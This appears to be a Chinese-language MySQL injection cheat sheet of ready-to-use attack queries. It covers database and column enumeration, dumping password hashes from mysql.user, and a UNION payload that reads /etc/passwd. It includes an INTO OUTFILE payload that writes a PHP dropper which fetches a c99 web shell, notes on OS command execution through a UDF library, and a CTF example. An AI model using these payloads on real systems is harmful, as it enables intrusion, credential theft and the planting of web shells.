---
title: "Mysql 注入"
date: 2016-04-21 11:50
---



```	
Select Nth Row       SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
Select Nth Char      SELECT substr(‘abcd’, 3, 1); # returns c
Bitwise AND          SELECT 6 & 2; # returns 2
                     SELECT 6 & 1; # returns 0
ASCII Value -> Char  SELECT char(65); # returns A
Char -> ASCII Value  SELECT ascii(‘A’); # returns 65
Casting              SELECT cast(’1′ AS unsigned integer);
                     SELECT cast(’123′ AS char);
String Concatenation SELECT CONCAT(‘A’,'B’); #returns AB
                     SELECT CONCAT(‘A’,'B’,'C’); # returns ABC
If Statement         SELECT if(1=1,’foo’,'bar’); — returns ‘foo’
Case Statement       SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A
Avoiding Quotes      SELECT 0×414243; # returns ABC
Time Delay           SELECT BENCHMARK(1000000,MD5(‘A’));
                     SELECT SLEEP(5); # >= 5.0.12
Make DNS Requests	 Impossible?
Command Execution    If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.

```

## 0x01 信息收集

```
system_user()     系统用户名
user()            MYSQL用户名 
current_user()    当前用户名
session_user()    连接数据库的用户名
database()        当前数据库名
schema()          当前数据库名
version()         当前数据库版本信息
@@version
load_file()       MYSQL读取本地文件

@@datadir         Location of DB files
@@hostname        服务器主机名
```

```
List Users              SELECT user FROM mysql.user; — priv
List Password Hashes    SELECT host, user, password FROM mysql.user; — priv

SELECT distinct(db) FROM mysql.db — priv
```

## 0x02 information_schema

> MySQL >= v5.0

```
# 查看数据库服务器上的数据库
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA

# 查看某个数据库里面的数据表
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema ='数据库名'

# 查看某个数据表里面的字段
#   默认当前数据库
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name ='表名'
#   指定数据库
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name ='表名' AND table_schema ='数据库名'

SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'

# find table which have a column called ‘username’
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’

# List Privilege
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
```


## 0x03 注释

```
 -- comment     # '--' 前后有空格
 
#comment

/*comment*/
```

## 0x04 文件权限

查询用户读写文件操作权限：

```
# 需要root用户来执行 	MySQL 4/5
SELECT file_priv FROM mysql.user WHERE user = 'username';

# 普通用户都可以 	MySQL 5
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%'; 	
```

## 0x05 load_file()

用户有文件操作权限则可以读取文件

```
…' UNION ALL SELECT LOAD_FILE('/etc/passwd')    — priv, can only read world-readable files.


SELECT LOAD_FILE(0x2F6574632F706173737764);
```

要求：

```
文件必须在服务器上。
LOAD_FILE()函数操作文件的当前目录是@@datadir 。
MySQL用户必须拥有对此文件读取的权限。
文件大小必须小于 max_allowed_packet。
@@max_allowed_packet的默认大小是1047552 字节
文件不存在或不可读，返回NULL
```

## 0x06 写文件

如果用户有文件操作权限可以写文件

```
INTO OUTFILE/DUMPFILE

SELECT * FROM mytable INTO dumpfile '/tmp/somefile'; — priv, write to file system
```

```
SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'

http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt
```

注：

```
INTO OUTFILE 不可以覆盖已存在的文件。
INTO OUTFILE 必须是最后一个查询。
引号是必须的，因为没有办法可以编码路径名
```
 
## 0x 实战

### group by with rollup

> alictf 2015 FuckMySQL

[group by document][4]

key code:

```php
$result = $db->query($sql);
if ($result->num_rows == 1) {
    $row = $result->fetch_assoc();
    if ($row['key2'] == $_POST['key2']) {
        echo "=.= Y are u so diao? I will give you a flag!  ".$flag;
        exit;
    }
} else {
    echo "I am fucking!";
}
```
 
## 参考：

[乌云 mySql 注入科普][1]

[乌云 mysql 注入技巧][3]

[crack mysql password][2]

[1]: http://drops.wooyun.org/tips/123
[2]: http://www.openwall.com/john/
[3]: http://drops.wooyun.org/tips/7299
[4]: http://dev.mysql.com/doc/refman/5.5/en/group-by-modifiers.html